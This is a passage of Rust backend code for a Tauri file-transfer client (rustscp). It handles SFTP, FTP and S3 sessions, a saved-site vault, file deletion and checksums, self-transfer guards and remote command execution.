    let (scheme, authority, rest) = split_url(&endpoint);
    if authority.is_empty() || authority_has_port(authority) {
        return endpoint;
    }
    format!("{scheme}{authority}:{port}{rest}")
}

/// SigV4 signing region for an endpoint: `<...>.s3.<region>.<provider>` /
/// `s3-<region>.amazonaws.com` style hosts (AWS, Wasabi, Backblaze B2...), `auto` for
/// Cloudflare R2, otherwise `us-east-1` (MinIO and most S3-compatible servers).
pub(crate) fn s3_region_from_endpoint(endpoint: &str) -> String {
    let (_, authority, _) = split_url(endpoint);
    let host = if authority_has_port(authority) {
        authority
            .rsplit_once(':')
            .map(|(h, _)| h)
            .unwrap_or(authority)
    } else {
        authority
    };
    let host = host.to_ascii_lowercase();
    if host.ends_with(".r2.cloudflarestorage.com") {
        return "auto".to_string();
    }
    let looks_like_region =
        |l: &str| l.contains('-') && l.chars().any(|c| c.is_ascii_digit()) && l != "external-1";
    let labels: Vec<&str> = host.split('.').collect();
    for (i, label) in labels.iter().enumerate() {
        if *label == "s3" || *label == "s3-fips" {
            // s3.<region>.amazonaws.com, s3.dualstack.<region>.amazonaws.com
            if let Some(next) = labels[i + 1..].iter().find(|l| **l != "dualstack") {
                if looks_like_region(next) {
                    return next.to_string();
                }
            }
        } else if let Some(region) = label.strip_prefix("s3-") {
            // legacy s3-<region>.amazonaws.com
            if host.ends_with(".amazonaws.com") && looks_like_region(region) {
                return region.to_string();
            }
        }
    }
    "us-east-1".to_string()
}

// ---------------------- CONNECTION & SESSION COMMANDS ----------------------

#[tauri::command]
pub async fn connect_session(
    state: tauri::State<'_, AppState>,
    config: ConnectionConfig,
) -> Result<String, String> {
    let mut config = config;
    {
        // The WebView only ever holds the stored-secret marker for saved sites.
        let sites = state.saved_sites.read().await;
        let stored = sites.iter().find(|s| s.id == config.id);
        restore_stored_secret(&mut config, stored);
    }

    let vfs: Arc<dyn VirtualFileSystem> = match config.protocol {
        Protocol::Local => Arc::new(LocalFsDriver::new()),

        Protocol::Sftp => {
            let driver = SftpDriver::new(config.clone());
            driver.connect().await.map_err(|e| e.to_string())?;
            let driver = Arc::new(driver);
            register_sftp_driver(&driver);
            driver
        }

        Protocol::S3 => {
            let endpoint = s3_endpoint(&config.host, config.port);
            let region = s3_region_from_endpoint(&endpoint);
            let s3_cfg = S3Config {
                endpoint,
                region,
                access_key: config.username.clone(),
                secret_key: match &config.auth {
                    rustscp_core::AuthMethod::Password(p) => p.clone(),
                    _ => "".to_string(),
                },
                bucket: if config.remote_root.trim_matches('/').is_empty() {
                    None
                } else {
                    Some(config.remote_root.trim_matches('/').to_string())
                },
            };
            Arc::new(S3Driver::new(s3_cfg))
        }

        Protocol::Ftp => {
            let ftp_cfg = FtpConfig {
                host: config.host.clone(),
                port: if config.port == 0 { 21 } else { config.port },
                username: config.username.clone(),
                password: match &config.auth {
                    rustscp_core::AuthMethod::Password(p) => Some(p.clone()),
                    _ => None,
                },
            };
            let driver = FtpDriver::new(ftp_cfg);
            driver.connect().await.map_err(|e| e.to_string())?;
            Arc::new(driver)
        }

        Protocol::WebDav => {
            return Err("WebDAV protocol support requires endpoint URL".to_string());
        }
    };

    // The session id is chosen while holding the write lock, so it is unique among the
    // active sessions (connecting the same saved site twice gets a second id) and always
    // a safe path component (it names the session's cache directory).
    let mut sessions = state.active_sessions.write().await;
    let session_id = choose_session_id(&config.id, |candidate| {
        candidate == "local" || sessions.contains_key(candidate)
    });
    sessions.insert(session_id.clone(), vfs.clone());
    drop(sessions);

    let is_local = config.protocol == Protocol::Local;
    // What agents see about the session: name, protocol and host, never credentials.
    let agent_info = ConnectionInfo {
        name: config.name.clone(),
        protocol: config.protocol.to_string(),
        host: config.host.clone(),
    };
    let mut configs = state.session_configs.write().await;
    configs.insert(session_id.clone(), config);
    drop(configs);

    // Register remote sessions with the MCP server so AI agents can browse them. Local
    // sessions never are: agents get no unrestricted access to this computer's disk.
    if !is_local {
        state
            .mcp_server
            .register_session(session_id.clone(), agent_info, vfs)
            .await;
    }

    Ok(session_id)
}

#[tauri::command]
pub async fn disconnect_session(
    state: tauri::State<'_, AppState>,
    session_id: String,
) -> Result<(), String> {
    if session_id == "local" {
        return Err("Cannot disconnect local session".to_string());
    }
    require_valid_session_id(&session_id)?;
    // Each guard lives only for its own statement.
    let removed = state.active_sessions.write().await.remove(&session_id);
    state.session_configs.write().await.remove(&session_id);

    // The MCP registry holds a second Arc of the driver: without this the SSH/FTP
    // connection would stay open until the app quits.
    state.mcp_server.unregister_connection(&session_id).await;

    // Background work that targets this session stops with it.
    stop_continuous_sync_if_targets(&state, &session_id).await;
    let disk = state.virtual_disks.lock().await.remove(&session_id);
    if let Some(mut server) = disk {
        if let Err(e) = server.unmount_and_stop().await {
            tracing::warn!("could not unmount the virtual disk of {session_id}: {e}");
        }
    }

    let _ = state.disk_cache.clear_session(&session_id).await;
    // Last reference held here (transfers / external-editor watchers may still hold
    // theirs until they notice the session is gone).
    drop(removed);

    Ok(())
}

#[tauri::command]
pub async fn get_saved_sites(
    state: tauri::State<'_, AppState>,
) -> Result<Vec<ConnectionConfig>, String> {
    let sites = state.saved_sites.read().await;
    // Secrets stay in the backend: the WebView gets the stored-secret marker instead.
    Ok(redact_sites(&sites))
}

#[tauri::command]
pub async fn save_site(
    state: tauri::State<'_, AppState>,
    config: ConnectionConfig,
) -> Result<(), String> {
    let mut config = config;
    config.id = normalize_site_id(&config.id);
    // The write guard serializes saves (the newest list is always the one on disk); the
    // PBKDF2 + file write run on a blocking thread, and memory is only updated once the
    // vault on disk has the new list.
    let mut sites = state.saved_sites.write().await;
    let mut updated = sites.clone();
    let existing = updated.iter().position(|s| s.id == config.id);
    restore_stored_secret(&mut config, existing.map(|pos| &updated[pos]));
    if let Some(pos) = existing {
        updated[pos] = config;
    } else {
        updated.push(config);
    }
    rustscp_core::vault::save_local_vault_async(updated.clone())
        .await
        .map_err(|e| e.to_string())?;
    *sites = updated;
    Ok(())
}

#[tauri::command]
pub async fn delete_site(state: tauri::State<'_, AppState>, id: String) -> Result<(), String> {
    let mut sites = state.saved_sites.write().await;
    let mut updated = sites.clone();
    updated.retain(|s| s.id != id);
    rustscp_core::vault::save_local_vault_async(updated.clone())
        .await
        .map_err(|e| e.to_string())?;
    *sites = updated;
    Ok(())
}

#[tauri::command]
pub async fn export_sites_vault(
    state: tauri::State<'_, AppState>,
    password: String,
) -> Result<String, String> {
    if password.trim().is_empty() {
        return Err("A senha para proteger o cofre não pode ser vazia.".to_string());
    }
    let exportable: Vec<_> = {
        let sites = state.saved_sites.read().await;
        sites.iter().filter(|s| s.id != "local").cloned().collect()
    };
    let envelope =
        rustscp_core::vault::encrypt_sites_async(exportable, password.trim().to_string())
            .await
            .map_err(|e| format!("Erro ao cifrar cofre: {e}"))?;
    let json = rustscp_core::serialize_vault_to_json(&envelope)
        .map_err(|e| format!("Erro ao gerar arquivo do cofre: {e}"))?;
    Ok(json)
}

#[tauri::command]
pub async fn import_sites_vault(
    state: tauri::State<'_, AppState>,
    vault_json: String,
    password: String,
    merge_mode: String,
) -> Result<Vec<ConnectionConfig>, String> {
    if password.trim().is_empty() {
        return Err("A senha do cofre é obrigatória para descriptografar os dados.".to_string());
    }
    let envelope = rustscp_core::parse_vault_from_json(vault_json.trim())
        .map_err(|e| format!("Arquivo de cofre inválido ou corrompido: {e}"))?;
    let imported_sites =
        rustscp_core::vault::decrypt_sites_async(envelope, password.trim().to_string())
            .await
            .map_err(|e| format!("Falha ao descriptografar: {e}"))?;

    // Imported ids become session ids and cache directory names: re-id anything that is
    // not `[A-Za-z0-9_-]{1,64}`. A secret that is literally the marker is dropped.
    let mut seen_ids = std::collections::HashSet::new();
    let imported_sites: Vec<ConnectionConfig> = imported_sites
        .into_iter()
        .filter(|s| s.id != "local")
        .map(|mut s| {
            s.id = normalize_site_id(&s.id);
            if s.id == "local" || !seen_ids.insert(s.id.clone()) {
                s.id = normalize_site_id("");
                seen_ids.insert(s.id.clone());
            }
            restore_stored_secret(&mut s, None);
            s
        })
        .collect();

    let mut sites = state.saved_sites.write().await;
    let local_cfg = ConnectionConfig::local();

    let updated = if merge_mode == "replace" {
        let mut new_list = vec![local_cfg];
        for s in imported_sites {
            if s.id != "local" {
                new_list.push(s);
            }
        }
        new_list
    } else {
        // Merge: adiciona ou atualiza pelo id ou host
        let mut merged = sites.clone();
        for s in imported_sites {
            if s.id == "local" {
                continue;
            }
            if let Some(pos) = merged.iter().position(|existing| existing.id == s.id) {
                merged[pos] = s;
            } else {
                merged.push(s);
            }
        }
        merged
    };

    // Memory changes only after the vault on disk has the new list.
    rustscp_core::vault::save_local_vault_async(updated.clone())
        .await
        .map_err(|e| e.to_string())?;
    *sites = updated;
    Ok(redact_sites(&sites))
}

#[tauri::command]
pub async fn get_vault_security_info(
    state: tauri::State<'_, AppState>,
) -> Result<rustscp_core::VaultSecurityInfo, String> {
    let site_count = {
        let sites = state.saved_sites.read().await;
        sites.iter().filter(|s| s.id != "local").count()
    };
    // Reads the vault header from disk: keep it off the async workers.
    let mut info = tokio::task::spawn_blocking(move || {
        rustscp_core::vault::local_vault_security_info(site_count)
    })
    .await
    .map_err(|e| e.to_string())?;
    info.load_error = state.vault_load_error.clone();
    info.backup_path = state.vault_backup_path.clone();
    Ok(info)
}

// ---------------------- FILE SYSTEM OPERATIONS ----------------------

#[tauri::command]
pub async fn list_directory(
    state: tauri::State<'_, AppState>,
    session_id: String,
    path: String,
    bypass_cache: Option<bool>,
) -> Result<Vec<FileEntry>, String> {
    let bypass = bypass_cache.unwrap_or(false);

    // Fast memory & catalog cache lookup (drastically accelerates remote SFTP/FTP/S3 directory browsing)
    if !bypass {
        if let Some(cached) = state.disk_cache.get_catalog(&session_id, &path).await {
            return Ok(cached);
        }
    }

    let vfs = get_vfs(&state, &session_id).await?;

    let entries = vfs.list_dir(&path).await.map_err(|e| e.to_string())?;

    // Cache the fresh entries in memory catalog for instant back/forward/up navigation
    state
        .disk_cache
        .put_catalog(&session_id, &path, entries.clone())
        .await;

    Ok(entries)
}

#[tauri::command]
pub async fn get_session_default_path(
    state: tauri::State<'_, AppState>,
    session_id: String,
) -> Result<String, String> {
    let vfs = get_vfs(&state, &session_id).await?;

    vfs.get_default_path().await.map_err(|e| e.to_string())
}

#[tauri::command]
pub async fn read_file_content(
    state: tauri::State<'_, AppState>,
    session_id: String,
    path: String,
) -> Result<String, String> {
    let vfs = get_vfs(&state, &session_id).await?;

    // Size first, so a multi-GB log is never pulled into memory and over IPC.
    if let Ok(meta) = vfs.metadata(&path).await {
        if meta.is_dir() {
            return Err(format!("'{}' is a folder, not a file", path));
        }
        if meta.size > EDITOR_MAX_BYTES {
            return Err(format!("{}:{}", E_TOO_LARGE, meta.size));
        }
    }

    let bytes = vfs.read_file(&path).await.map_err(core_err)?;
    // Some servers report size 0 for special or still-growing files: check again.
    if bytes.len() as u64 > EDITOR_MAX_BYTES {
        return Err(format!("{}:{}", E_TOO_LARGE, bytes.len()));
    }
    decode_editor_text(Vec::from(bytes))
}

#[tauri::command]
pub async fn write_file_content(
    state: tauri::State<'_, AppState>,
    session_id: String,
    path: String,
    content: String,
) -> Result<(), String> {
    let vfs = get_vfs(&state, &session_id).await?;

    vfs.write_file(&path, bytes::Bytes::from(content.into_bytes()))
        .await
        .map_err(|e| e.to_string())?;

    state
        .disk_cache
        .invalidate_catalog(&session_id, &path)
        .await;
    // The virtual disk serves file contents from the cache: drop the stale copy.
    state
        .disk_cache
        .invalidate_content(&session_id, &path)
        .await;
    Ok(())
}

#[tauri::command]
pub async fn create_new_directory(
    state: tauri::State<'_, AppState>,
    session_id: String,
    path: String,
) -> Result<(), String> {
    let vfs = get_vfs(&state, &session_id).await?;

    vfs.create_dir(&path).await.map_err(|e| e.to_string())?;

    state
        .disk_cache
        .invalidate_catalog(&session_id, &path)
        .await;
    Ok(())
}

/// `path` without trailing `/` (the root `/` stays as it is).
fn trim_trailing_slash(path: &str) -> &str {
    if path.len() > 1 {
        let t = path.trim_end_matches('/');
        if t.is_empty() {
            "/"
        } else {
            t
        }
    } else {
        path
    }
}

fn is_not_found(err: &rustscp_core::CoreError) -> bool {
    match err {
        rustscp_core::CoreError::NotFound(_) => true,
        rustscp_core::CoreError::Io(io) => io.kind() == std::io::ErrorKind::NotFound,
        _ => false,
    }
}

/// Parent folder of a remote `/`-separated path (`None` for relative names).
fn remote_parent_dir(path: &str) -> Option<&str> {
    match path.rfind('/') {
        Some(0) => Some("/"),
        Some(i) => Some(&path[..i]),
        None => None,
    }
}

/// The subset of `targets` that still exists, with one listing per parent folder (falls
/// back to one `exists` per path when a folder cannot be listed).
async fn remaining_remote_paths(
    vfs: &Arc<dyn VirtualFileSystem>,
    targets: &[String],
) -> Vec<String> {
    let mut by_parent: std::collections::BTreeMap<Option<&str>, Vec<&String>> =
        std::collections::BTreeMap::new();
    for t in targets {
        by_parent.entry(remote_parent_dir(t)).or_default().push(t);
    }
    let mut remaining = Vec::new();
    for (parent, items) in by_parent {
        let listing = match parent {
            Some(dir) => vfs.list_dir(dir).await.ok(),
            None => None,
        };
        match listing {
            Some(entries) => {
                let names: std::collections::HashSet<&str> =
                    entries.iter().map(|e| e.name.as_str()).collect();
                for t in items {
                    let name = t.rsplit('/').next().unwrap_or(t);
                    if names.contains(name) {
                        remaining.push(t.clone());
                    }
                }
            }
            None => {
                for t in items {
                    if !matches!(vfs.exists(t).await, Ok(false)) {
                        remaining.push(t.clone());
                    }
                }
            }
        }
    }
    remaining
}

/// Removes one remote file or folder through the VFS; a path that is already gone is
/// not an error (an earlier step may have deleted it).
async fn remove_remote_path(vfs: &Arc<dyn VirtualFileSystem>, path: &str) -> Result<(), String> {
    let outcome = match vfs.metadata(path).await {
        Ok(meta) if meta.is_dir() => vfs.remove_dir(path, true).await,
        Ok(_) => vfs.remove_file(path).await,
        Err(e) if is_not_found(&e) => return Ok(()),
        Err(_) => vfs.remove_file(path).await,
    };
    match outcome {
        Ok(()) => Ok(()),
        Err(e) if is_not_found(&e) => Ok(()),
        Err(e) => Err(format!("Could not delete '{}': {}", path, e)),
    }
}

#[tauri::command]
pub async fn delete_items(
    state: tauri::State<'_, AppState>,
    session_id: String,
    paths: Vec<String>,
) -> Result<(), String> {
    if paths.is_empty() {
        return Ok(());
    }

    let vfs = get_vfs(&state, &session_id).await?;

    // Decided by protocol, not by id: a Local session opened from the Site Manager must not
    // go through the shell (on Windows that would be cmd.exe, where POSIX quoting is void).
    if vfs.protocol() != Protocol::Local {
        let targets: Vec<String> = paths
            .iter()
            .map(|p| trim_trailing_slash(p).to_string())
            .collect();
        if targets.iter().any(|t| t.trim().is_empty() || t == "/") {
            return Err("Refusing to delete the root directory".to_string());
        }

        // Quick delete: `rm -rf -- 'path1' 'path2' ...` over the SSH channel is orders of
        // magnitude faster than a recursive SFTP traversal of large trees. Only sent to a
        // POSIX shell: fish or cmd.exe could run part of a crafted file name.
        let mut quick_attempted = false;
        if posix_shell_available(&vfs).await {
            for chunk in targets.chunks(50) {
                let cmd = format!("rm -rf -- {}", sh_join(chunk));
                match vfs.execute_command(&cmd).await {
                    Ok((0, _, _)) => quick_attempted = true,
                    Ok((code, _, stderr)) => {
                        quick_attempted = true;
                        tracing::warn!(
                            "quick delete exited with {code}, finishing through the file API: {}",
                            stderr.trim()
                        );
                        break;
                    }
                    Err(e) => {
                        tracing::warn!("quick delete unavailable, using the file API: {e}");
                        break;
                    }
                }
            }
        }

        // `rm -rf` exits 0 for paths it cannot see, e.g. when the shell sees another
        // namespace than SFTP (chroot, NAS shares): check through the file API what is
        // still there and remove that the slow way.
        let remaining = if quick_attempted {
            remaining_remote_paths(&vfs, &targets).await
        } else {
            targets.clone()
        };

        let mut result = Ok(());
        for path in &remaining {
            if let Err(e) = remove_remote_path(&vfs, path).await {
                result = Err(e);
                break;
            }
        }
        for path in &targets {
            state.disk_cache.invalidate_catalog(&session_id, path).await;
        }
        return result;
    }

    // Local file system deletion
    for path in &paths {
        let p = std::path::Path::new(path);
        match tokio::fs::symlink_metadata(p).await {
            Ok(meta) => {
                if meta.is_dir() {
                    tokio::fs::remove_dir_all(p)
                        .await
                        .map_err(|e| e.to_string())?;
                } else {
                    tokio::fs::remove_file(p).await.map_err(|e| e.to_string())?;
                }
            }
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
                // already gone, ignore
            }
            Err(e) => {
                return Err(e.to_string());
            }
        }
        state.disk_cache.invalidate_catalog(&session_id, path).await;
    }

    Ok(())
}

#[tauri::command]
pub async fn delete_item(
    state: tauri::State<'_, AppState>,
    session_id: String,
    path: String,
    is_dir: bool,
) -> Result<(), String> {
    let _ = is_dir;
    delete_items(state, session_id, vec![path]).await
}

#[tauri::command]
pub async fn rename_item(
    state: tauri::State<'_, AppState>,
    session_id: String,
    from: String,
    to: String,
) -> Result<(), String> {
    let vfs = get_vfs(&state, &session_id).await?;

    vfs.rename(&from, &to).await.map_err(|e| e.to_string())?;

    state
        .disk_cache
        .invalidate_catalog(&session_id, &from)
        .await;
    state.disk_cache.invalidate_catalog(&session_id, &to).await;
    Ok(())
}

#[tauri::command]
pub async fn change_permissions(
    state: tauri::State<'_, AppState>,
    session_id: String,
    path: String,
    mode: u32,
) -> Result<(), String> {
    let vfs = get_vfs(&state, &session_id).await?;

    vfs.set_permissions(&path, mode)
        .await
        .map_err(|e| e.to_string())?;

    state
        .disk_cache
        .invalidate_catalog(&session_id, &path)
        .await;
    Ok(())
}

#[tauri::command]
pub async fn get_file_properties(
    state: tauri::State<'_, AppState>,
    session_id: String,
    path: String,
) -> Result<FileEntry, String> {
    let vfs = get_vfs(&state, &session_id).await?;

    vfs.metadata(&path).await.map_err(|e| e.to_string())
}

/// Hash algorithms offered by the checksum dialog.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ChecksumAlgo {
    Md5,
    Sha256,
}

impl ChecksumAlgo {
    /// Accepts "SHA-256", "sha256", "SHA_256", "MD5" ... (empty means SHA-256). Anything
    /// else is an error, never a SHA-256 hash labelled with another name.
    fn parse(name: &str) -> Result<Self, String> {
        let norm: String = name
            .chars()
            .filter(|c| c.is_ascii_alphanumeric())
            .collect::<String>()
            .to_ascii_uppercase();
        match norm.as_str() {
            "MD5" => Ok(Self::Md5),
            "SHA256" | "" => Ok(Self::Sha256),
            _ => Err(format!(
                "Unsupported checksum algorithm '{}': use SHA-256 or MD5",
                name
            )),
        }
    }

    fn label(self) -> &'static str {
        match self {
            Self::Md5 => "MD5",
            Self::Sha256 => "SHA-256",
        }
    }

    fn hex_len(self) -> usize {
        match self {
            Self::Md5 => 32,
            Self::Sha256 => 64,
        }
    }

    /// POSIX shell snippet hashing stdin (GNU coreutils, BSD/macOS, busybox).
    fn remote_tool(self) -> &'static str {
        match self {
            Self::Md5 => {
                "if command -v md5sum >/dev/null 2>&1; then md5sum; \
                 elif command -v md5 >/dev/null 2>&1; then md5 -q; else exit 4; fi"
            }
            Self::Sha256 => {
                "if command -v sha256sum >/dev/null 2>&1; then sha256sum; \
                 elif command -v shasum >/dev/null 2>&1; then shasum -a 256; else exit 4; fi"
            }
        }
    }
}

enum StreamingHasher {
    Md5(md5::Context),
    Sha256(Sha256),
}

impl StreamingHasher {
    fn new(algo: ChecksumAlgo) -> Self {
        match algo {
            ChecksumAlgo::Md5 => Self::Md5(md5::Context::new()),
            ChecksumAlgo::Sha256 => Self::Sha256(Sha256::new()),
        }
    }

    fn update(&mut self, data: &[u8]) {
        match self {
            Self::Md5(ctx) => ctx.consume(data),
            Self::Sha256(h) => h.update(data),
        }
    }

    fn finish(self) -> String {
        match self {
            Self::Md5(ctx) => format!("{:x}", ctx.finalize()),
            Self::Sha256(h) => hex::encode(h.finalize()),
        }
    }
}

/// Parses the output of [`remote_checksum_command`]: the byte count on the first line,
/// then `<hex>` (optionally followed by `  -`).
fn parse_remote_checksum(stdout: &str, algo: ChecksumAlgo) -> Option<(u64, String)> {
    let mut lines = stdout.lines().map(str::trim).filter(|l| !l.is_empty());
    let size: u64 = lines.next()?.parse().ok()?;
    let hash = lines
        .next()?
        .split_whitespace()
        .next()?
        .to_ascii_lowercase();
    if hash.len() == algo.hex_len() && hash.chars().all(|c| c.is_ascii_hexdigit()) {
        Some((size, hash))
    } else {
        None
    }
}

fn remote_checksum_command(path: &str, algo: ChecksumAlgo) -> String {
    format!(
        "f={}; [ -f \"$f\" ] || exit 3; wc -c < \"$f\" && {{ {}; }} < \"$f\"",
        sh_quote(path),
        algo.remote_tool()
    )
}

/// Hash computed by the SSH server itself (no download). Only trusted when the server
/// saw a file of the size SFTP reports, so a shell that sees another file system than
/// SFTP (chroot, NAS share) cannot return the hash of a different file.
async fn remote_checksum(
    vfs: &Arc<dyn VirtualFileSystem>,
    path: &str,
    algo: ChecksumAlgo,
    expected_size: u64,
) -> Option<String> {
    if vfs.protocol() != Protocol::Sftp || !posix_shell_available(vfs).await {
        return None;
    }
    let (code, stdout, _) = vfs
        .execute_command(&remote_checksum_command(path, algo))
        .await
        .ok()?;
    if code != 0 {
        return None;
    }
    match parse_remote_checksum(&stdout, algo) {
        Some((size, hash)) if size == expected_size => Some(hash),
        _ => None,
    }
}

#[tauri::command]
pub async fn calculate_checksum(
    state: tauri::State<'_, AppState>,
    session_id: String,
    path: String,
    algorithm: String,
) -> Result<ChecksumResult, String> {
    let algo = ChecksumAlgo::parse(&algorithm)?;
    let vfs = get_vfs(&state, &session_id).await?;

    // Metadata is optional (some FTP servers cannot stat a single file); without it the
    // file is simply streamed.
    let meta = vfs.metadata(&path).await.ok();
    if meta.as_ref().is_some_and(|m| m.is_dir()) {
        return Err(format!("'{}' is a folder: choose a file", path));
    }

    if let Some(meta) = &meta {
        if let Some(hash) = remote_checksum(&vfs, &path, algo, meta.size).await {
            return Ok(ChecksumResult {
                algorithm: algo.label().to_string(),
                hash,
            });
        }
    }

    Ok(ChecksumResult {
        algorithm: algo.label().to_string(),
        hash: stream_checksum(&vfs, &path, algo).await?,
    })
}

/// Hashes a file read in chunks: memory use stays at one chunk whatever the file size.
async fn stream_checksum(
    vfs: &Arc<dyn VirtualFileSystem>,
    path: &str,
    algo: ChecksumAlgo,
) -> Result<String, String> {
    let mut hasher = StreamingHasher::new(algo);
    let mut offset = 0u64;
    loop {
        let chunk = vfs
            .read_range(path, offset, STREAM_CHUNK_BYTES)
            .await
            .map_err(core_err)?;
        if chunk.is_empty() {
            break;
        }
        hasher.update(&chunk);
        offset += chunk.len() as u64;
        if (chunk.len() as u64) < STREAM_CHUNK_BYTES {
            break;
        }
    }
    Ok(hasher.finish())
}

// ---------------------- FILE TRANSFER & STREAMING ----------------------

/// Port a config connects to (0 means the protocol's default).
fn effective_port(cfg: &ConnectionConfig) -> u16 {
    if cfg.port != 0 {
        return cfg.port;
    }
    match cfg.protocol {
        Protocol::Ftp => 21,
        Protocol::Sftp => 22,
        Protocol::S3 | Protocol::WebDav => 443,
        Protocol::Local => 0,
    }
}

/// Host name for comparisons: trimmed, without IPv6 brackets, lower case.
fn comparable_host(host: &str) -> String {
    host.trim()
        .trim_start_matches('[')
        .trim_end_matches(']')
        .to_ascii_lowercase()
}

/// Whether two sessions see the same files: two local sessions, or two connections to the
/// same server (the same saved site connected twice gets two session ids). Identical paths
/// are then the same file, and copying one onto itself would truncate it. The user name is
/// ignored on purpose: two accounts on one host can reach the same files, and the only
/// cost is refusing a copy onto the identical path.
pub(crate) fn same_file_tree(a: &ConnectionConfig, b: &ConnectionConfig) -> bool {
    if a.protocol != b.protocol {
        return false;
    }
    match a.protocol {
        Protocol::Local => true,
        Protocol::S3 => {
            s3_endpoint(&a.host, a.port) == s3_endpoint(&b.host, b.port)
                && a.remote_root.trim_matches('/') == b.remote_root.trim_matches('/')
        }
        _ => {
            comparable_host(&a.host) == comparable_host(&b.host)
                && effective_port(a) == effective_port(b)
        }
    }
}

/// Lexical normalization (`\` as `/`, no `.`/`..`/empty parts) for comparing two paths of
/// one file tree.
fn normalize_path_for_compare(path: &str) -> String {
    let unified = path.trim().replace('\\', "/");
    let absolute = unified.starts_with('/');
    let mut parts: Vec<&str> = Vec::new();
    for part in unified.split('/') {
        match part {
            "" | "." => {}
            ".." => {
                parts.pop();
            }
            p => parts.push(p),
        }
    }
    let joined = parts.join("/");
    if absolute {
        format!("/{joined}")
    } else {
        joined
    }
}

/// Why a transfer inside one file tree would destroy its own source: the destination is
/// the source itself, or lies inside it (a folder copied into itself).
pub(crate) fn same_tree_transfer_rejection(source: &str, dest: &str) -> Option<String> {
    let s = normalize_path_for_compare(source);
    let d = normalize_path_for_compare(dest);
    if s == d {
        return Some("Source and destination are the same; nothing was transferred".to_string());
    }
    let inside = if s == "/" || s.is_empty() {
        true
    } else {
        d.starts_with(&format!("{s}/"))
    };
    if inside {
        return Some(
            "A folder cannot be copied or moved into itself; nothing was transferred".to_string(),
        );
    }
    None
}

/// Rejects a transfer between two sessions over the same file tree whose destination is
/// its own source (see [`same_file_tree`]).
async fn reject_self_transfer(
    state: &AppState,
    source_session: &str,
    source_path: &str,
    dest_session: &str,
    dest_path: &str,
) -> Result<(), String> {
    let same_tree = source_session == dest_session || {
        let configs = state.session_configs.read().await;
        matches!(
            (configs.get(source_session), configs.get(dest_session)),
            (Some(a), Some(b)) if same_file_tree(a, b)
        )
    };
    match same_tree
        .then(|| same_tree_transfer_rejection(source_path, dest_path))
        .flatten()
    {
        Some(reason) if source_session != dest_session => Err(format!(
            "{reason} (both sessions are connected to the same server, so these paths are the \
             same files)"
        )),
        Some(reason) => Err(reason),
        None => Ok(()),
    }
}

#[tauri::command]
pub async fn transfer_file(
    state: tauri::State<'_, AppState>,
    source_session: String,
    source_path: String,
    dest_session: String,
    dest_path: String,
) -> Result<(), String> {
    let src_vfs = get_vfs_as(&state, &source_session, "Source").await?;
    let dst_vfs = get_vfs_as(&state, &dest_session, "Destination").await?;
    // Writing the destination truncates it first: never let it be the source itself.
    reject_self_transfer(
        &state,
        &source_session,
        &source_path,
        &dest_session,
        &dest_path,
    )
    .await?;

    // Streamed chunk by chunk when the destination supports positional writes.
    stream_copy_file(&src_vfs, &source_path, &dst_vfs, &dest_path).await?;

    state
        .disk_cache
        .invalidate_catalog(&dest_session, &dest_path)
        .await;
    state
        .disk_cache
        .invalidate_content(&dest_session, &dest_path)
        .await;

    Ok(())
}

// ---------------------- REMOTE COMMAND EXECUTION ----------------------

/// Largest stdout / stderr that `execute_remote_command` hands to the WebView; a longer
/// stream keeps its last part (where errors and summaries usually are).
const COMMAND_OUTPUT_MAX_BYTES: usize = 2 * 1024 * 1024;

/// Keeps the last `max` bytes of `text` (cut on a UTF-8 boundary, and on a line start when
/// one is near) behind a one-line note saying how much was dropped.
fn cap_command_output(text: String, max: usize) -> String {
    if text.len() <= max {
        return text;
    }
    let mut start = text.len() - max;
    while !text.is_char_boundary(start) {
        start += 1;
    }
    if let Some(nl) = text[start..].find('\n') {
        if nl < 4096 {
            start += nl + 1;
        }
    }
    format!(
        "[... {} earlier bytes of output omitted ...]\n{}",
        start,
        &text[start..]
    )
}

/// Readable text for a command the driver could not run to completion. Time limits and
/// protocol refusals (SFTP-only accounts, output over the driver's limit, protocols
/// without a shell) carry their own explanation, shown without the generic
/// "Operation timeout:" / "Protocol error:" prefix.
fn command_error_message(err: rustscp_core::CoreError) -> String {
    use rustscp_core::CoreError;
    match err {
        CoreError::Timeout(msg) if msg.trim().is_empty() => {
            "The command did not finish in time and was stopped".to_string()
        }
        CoreError::Timeout(msg) => msg,
        CoreError::Protocol(msg) if !msg.trim().is_empty() => msg,
        other => other.to_string(),
    }
}

#[tauri::command]
pub async fn execute_remote_command(
    state: tauri::State<'_, AppState>,
    session_id: String,
    command: String,
) -> Result<CommandExecutionResult, String> {
    let vfs = get_vfs(&state, &session_id).await?;

    let (exit_code, stdout, stderr) = vfs
        .execute_command(&command)
        .await
        .map_err(command_error_message)?;

    Ok(CommandExecutionResult {
        exit_code,
        stdout: cap_command_output(stdout, COMMAND_OUTPUT_MAX_BYTES),
        stderr: cap_command_output(stderr, COMMAND_OUTPUT_MAX_BYTES),
    })
}

// ---------------------- DIRECTORY SYNCHRONIZATION ----------------------

#[tauri::command]
pub async fn compare_and_sync_plan(
    state: tauri::State<'_, AppState>,
    local_session: String,
    local_dir: String,
    remote_session: String,
    remote_dir: String,
    options: SyncOptions,
) -> Result<Vec<SyncItem>, String> {
    let local_vfs = get_vfs_as(&state, &local_session, "Local").await?;
    let remote_vfs = get_vfs_as(&state, &remote_session, "Remote").await?;

    SyncEngine::compare_directories(local_vfs, remote_vfs, &local_dir, &remote_dir, &options)
        .await
        .map_err(|e| e.to_string())
}

// ---------------------- SMART ACTIONS & MCP ----------------------

/// Serializes read-modify-write cycles on `custom_actions.json`.
static CUSTOM_ACTIONS_LOCK: Mutex<()> = Mutex::const_new(());

fn custom_actions_path() -> std::path::PathBuf {
    get_rustscp_config_dir().join("custom_actions.json")
}

/// Custom actions saved by the Command Studio (empty when the file does not exist yet).
/// A file that cannot be parsed is an error, so it is never overwritten by a save.
fn read_custom_actions(path: &std::path::Path) -> Result<Vec<ActionDefinition>, String> {
    match std::fs::read_to_string(path) {
        Ok(data) if data.trim().is_empty() => Ok(Vec::new()),
        Ok(data) => serde_json::from_str(&data)
            .map_err(|e| format!("{} is not valid: {}", path.display(), e)),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(Vec::new()),
        Err(e) => Err(format!("Could not read {}: {}", path.display(), e)),
    }
}

/// Atomic write (temp file + fsync + rename): a crash never leaves a truncated file.
fn write_custom_actions(
    path: &std::path::Path,
    actions: &[ActionDefinition],
) -> Result<(), String> {
    if let Some(parent) = path.parent() {
        rustscp_core::vault::ensure_private_dir(parent)
